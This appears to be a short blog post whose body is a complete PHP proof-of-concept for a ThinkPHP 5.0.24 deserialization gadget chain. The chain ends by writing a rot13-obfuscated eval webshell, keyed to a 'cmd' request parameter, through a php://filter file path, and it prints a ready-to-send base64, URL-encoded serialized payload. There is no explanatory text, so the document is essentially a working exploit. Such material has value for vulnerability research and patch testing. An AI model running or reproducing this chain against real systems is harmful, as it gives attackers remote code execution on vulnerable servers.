---
title: ThinkPHP5.0.24反序列化POC
tags:
  - thinkphp
  - 反序列化
  - PoC
categories:
  - - 漏洞分析
description: 本文提供了ThinkPHP5.0.24反序列化POC
abbrlink: 5ce634cf
date: 2025-04-14 10:33:52
---
```php

<?php
namespace think\cache{

    abstract class Driver{

        /**
         * Driver constructor.
         */
        protected $options = [];
        protected $tag;
        public function __construct()
        {
            $this -> options = [
                'prefix' => '',
            ];
            $this -> tag = 'armandhe';
        }
    }
}

namespace think\cache\driver{

    use think\cache\Driver;

    class Memcached extends Driver{

        /**
         * Memcached constructor.
         */
        protected $handler = null;
        protected $options = [
            'host'     => '127.0.0.1',
            'port'     => 11211,
            'expire'   => 0,
            'timeout'  => 0, // 超时时间（单位：毫秒）
            'prefix'   => '',
            'username' => '', //账号
            'password' => '', //密码
            'option'   => [],
        ];
        public function __construct()
        {
            parent::__construct();
            $this -> options['expire'] = 0;
            $this -> handler = new File();
        }
    }
    class File extends Driver{

        /**
         * File constructor.
         */
        protected $options = [];
        public function __construct()
        {
            parent::__construct();
            $this -> options = [
                'expire'        => 0,
                'cache_subdir'  => false,
                'prefix'        => false,
                'path'          => 'php://filter/write=string.rot13/resource=',
                'data_compress' => false,
            ];
        }
    }
}

namespace think\session\driver{
    use think\cache\driver\Memcached;
    class Memcache{

        /**
         * Memcache constructor.
         */
        protected $handler = null;
        protected $config  = [
        ];
        public function __construct()
        {
            $this -> handler = new Memcached();
            $this -> config = [
                'host'         => '127.0.0.1', // memcache主机
                'port'         => 11211, // memcache端口
                'expire'       => 0, // session有效期
                'timeout'      => 0, // 连接超时时间（单位：毫秒）
                'persistent'   => true, // 长连接
                'session_name' => '<?cuc $n=fgegbhccre("_erdhrfg");riny($$n["pzq"])?>', // memcache key前缀
            ];
        }
    }

}


namespace think\console{

    use think\session\driver\Memcache;

    class Output{

        /**
         * Output constructor.
         */
        protected $styles = [];
        private $handle = null;
        public function __construct()
        {
            $this ->styles =[
              'getAttr',
            ];
            $this -> handle = new Memcache();
        }
    }
}

namespace think\model\relation{

    use think\model\Relation;

    abstract class OneToOne extends Relation{

        /**
         * OneToOne constructor.
         */
        protected $bindAttr = ['test'];
        public function __construct()
        {
            parent::__construct();
            $this -> bindAttr = [
                "armandhenewpy"
            ];
        }

    }
    class HasOne extends OneToOne{

        /**
         * HasOne constructor.
         */
        public function __construct()
        {
            parent::__construct();
        }
    }
}

namespace think\db{

    use think\console\Output;

    class Query{

        /**
         * Query constructor.
         */
        protected $model;
        public function __construct()
        {
            $this -> model = new Output();

        }
    }
}

namespace think\model{

    use think\db\Query;

    abstract class Relation{

        /**
         * Relation constructor.
         */
        protected $selfRelation;
        protected $query;
        public function __construct()
        {
            $this -> selfRelation = false;
            $this -> query = new Query();
        }
    }
}

namespace think{

    use think\console\Output;
    use think\model\relation\HasOne;

    abstract class Model{

        /**
         * Model constructor.
         */
        protected $parent;
        protected $append = [];
        protected $error;
        public function __construct()
        {
            $this -> parent = new Output();
            $this -> append = [
                'getError'
            ];
            $this -> error = new HasOne();
        }
    }
}
namespace think\model{

    use think\Model;

    class Pivot extends Model{

    }
}



namespace think\process\pipes{

    use think\model\Pivot;

    class Windows{

        /**
         * Windows constructor.
         */
        private $files = [];
        public function __construct()
        {
            $this -> files = ['test' => new Pivot()

        ];
        }
    }
}
namespace app\index\controller{
    use think\process\pipes\Windows;
    class Unserialization{
        function getpayload(){
            echo urlencode(base64_encode(serialize(new Windows())));
        }
    }
}
```
